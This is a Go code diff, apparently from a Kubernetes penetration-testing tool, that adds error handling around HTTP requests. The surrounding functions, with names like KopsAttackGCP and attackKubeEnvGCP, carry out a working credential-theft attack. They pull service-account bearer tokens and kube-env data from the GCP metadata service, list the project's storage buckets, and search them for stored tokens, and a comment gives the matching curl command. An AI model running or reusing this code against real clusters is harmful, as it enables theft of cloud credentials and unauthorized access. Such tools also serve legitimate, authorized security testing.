@@ -27,7 +27,11 @@ func GetGCPBearerTokenFromMetadataAPI(account string) (string, time.Time, error)
 	baseURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
 	urlSvcAccount := baseURL + account + "/token"
 
-	reqTokenRaw, statusCode := GetRequest(urlSvcAccount, headers, false)
+	reqTokenRaw, statusCode, err := GetRequest(urlSvcAccount, headers, false)
+	if err != nil {
+		fmt.Println("GetRequest in GetGCPBearerTokenFromMetadataAPI() failed with error", err)
+		return "", time.Now(), err
+	}
 
 	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) || (statusCode != 200) {
 		errorString := "[-] Error - could not perform request for " + urlSvcAccount
@@ -36,7 +40,7 @@ func GetGCPBearerTokenFromMetadataAPI(account string) (string, time.Time, error)
 	}
 
 	var token GCPToken
-	err := json.Unmarshal([]byte(reqTokenRaw), &token)
+	err = json.Unmarshal([]byte(reqTokenRaw), &token)
 	if err != nil {
 		return "", time.Now(), err
 	}
@@ -95,7 +99,10 @@ func KopsAttackGCP(serviceAccounts *[]ServiceAccount) (err error) {
 	headers = []HeaderLine{
 		HeaderLine{"Metadata-Flavor", "Google"},
 	}
-	projectID, _ := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
+	projectID, _, err := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
+	if err != nil {
+		return err
+	}
 	if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
 		msg := "[-] Could not get GCP project from metadata API"
 		println(msg)
@@ -111,7 +118,10 @@ func KopsAttackGCP(serviceAccounts *[]ServiceAccount) (err error) {
 
 	// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
 	urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
-	bucketListRaw, _ := GetRequest(urlListBuckets, headers, false)
+	bucketListRaw, _, err := GetRequest(urlListBuckets, headers, false)
+	if err != nil {
+		return err
+	}
 	if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
 		msg := "[-] blank bucket list or error retriving bucket list"
 		println(msg)
@@ -135,8 +145,8 @@ eachbucket:
 	for _, line := range bucketUrls {
 		println("Checking bucket for credentials:", line)
 		urlListObjects := line + "/o"
-		bodyListObjects, _ := GetRequest(urlListObjects, headers, false)
-		if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
+		bodyListObjects, _, err := GetRequest(urlListObjects, headers, false)
+		if (err != nil) || (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
 			continue
 		}
 		objectListLines := strings.Split(string(bodyListObjects), "\n")
@@ -155,8 +165,8 @@ eachbucket:
 					saTokenURL := objectURL + "?alt=media"
 
 					// We use the same headers[] from the previous GET request.
-					bodyToken, statusCode := GetRequest(saTokenURL, headers, false)
-					if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) || (statusCode != 200) {
+					bodyToken, statusCode, err := GetRequest(saTokenURL, headers, false)
+					if (err != nil) || (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) || (statusCode != 200) {
 						continue eachbucket
 					}
 					tokenLines := strings.Split(string(bodyToken), "\n")
@@ -195,7 +205,13 @@ func attackKubeEnvGCP(interactive bool) {
 	var headers = []HeaderLine{
 		{"Metadata-Flavor", "Google"},
 	}
-	kubeEnv, statusCode := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
+	kubeEnv, statusCode, err := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
+	if err != nil {
+		fmt.Println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+		fmt.Println("Error was", err)
+		pauseToHitEnter(interactive)
+		return
+	}
 	if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) || (statusCode != 200) {
 		println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
 		if statusCode != 200 {
@@ -219,8 +235,8 @@ func getGCPToken(interactive bool) {
 		{"Metadata-Flavor", "Google"},
 	}
 	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
-	svcAcctListRaw, _ := GetRequest(url, headers, false)
-	if (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
+	svcAcctListRaw, _, err := GetRequest(url, headers, false)
+	if (err != nil) || (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
 		pauseToHitEnter(interactive)
 		return
 	}
